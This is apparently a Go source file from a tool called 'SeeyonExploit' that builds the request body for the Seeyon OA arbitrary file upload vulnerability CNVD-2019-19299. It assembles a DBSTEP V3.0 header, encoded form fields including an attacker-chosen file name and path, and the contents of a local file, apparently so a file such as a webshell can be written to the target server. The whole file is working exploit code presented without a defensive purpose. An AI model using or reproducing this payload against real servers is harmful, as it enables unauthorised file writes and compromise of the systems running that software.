package CNVD201919299

import (
	"SeeyonExploit/utils"
	"bytes"
	"io"
	"io/ioutil"
	"os"
)

type Conf1 struct {
	FileName string
}
type Conf2 struct {
	Start int
	Len   int
}

func lineCounter(r io.Reader) (int, error) {
	buf := make([]byte, 32*1024)
	count := 0
	lineSep := []byte{'\n'}

	for {
		c, err := r.Read(buf)
		count += bytes.Count(buf[:c], lineSep)

		switch {
		case err == io.EOF:
			return count, nil

		case err != nil:
			return count, err
		}
	}
}

func uploadfile(file string) (string, int) {
	fil, err := os.Open(file)
	utils.PanicErr(err)
	defer fil.Close()
	content, err := ioutil.ReadAll(fil)
	utils.PanicErr(err)
	Content := string(content)
	Contentlength := len(Content)

	//统计文件行数
	fil2, err := os.Open(file)
	utils.PanicErr(err)
	defer fil2.Close()
	linecount, err2 := lineCounter(fil2)
	utils.PanicErr(err2)
	return Content, Contentlength + (linecount)*2 + 2
}

func GenPayload(file string, filename string, path string) string {
	content, contentlen := uploadfile(file)
	encFileName := Enc(filename, path)
	conf1 := Conf1{encFileName}
	payload1 := `DBSTEP V3.0     {{.Start}}             0               {{.Len}}             `
	payload2 := `DBSTEP=OKMLlKlV` + "\r\n" +
		`OPTION=S3WYOSWLBSGr` + "\r\n" +
		`currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66` + "\r\n" +
		`CREATEDATE=wUghPB3szB3Xwg66` + "\r\n" +
		`RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6` + "\r\n" + `originalFileId=wV66` + "\r\n" +
		`originalCreateDate=wUghPB3szB3Xwg66` + "\r\n" +
		`FILENAME={{.FileName}}` + "\r\n" + `needReadFile=yRWZdAS6` + "\r\n" + `CLIENTIP=wLVhqUKAz7uiz7uhz4d6` + "\r\n" + `originalCreateDate=wLSGP4oEzLKAz4=iz=66`
	a := utils.Render(conf1, payload2)
	conf2 := Conf2{len(a) - 1, contentlen}
	b := utils.Render(conf2, payload1)
	return b + a + content
}
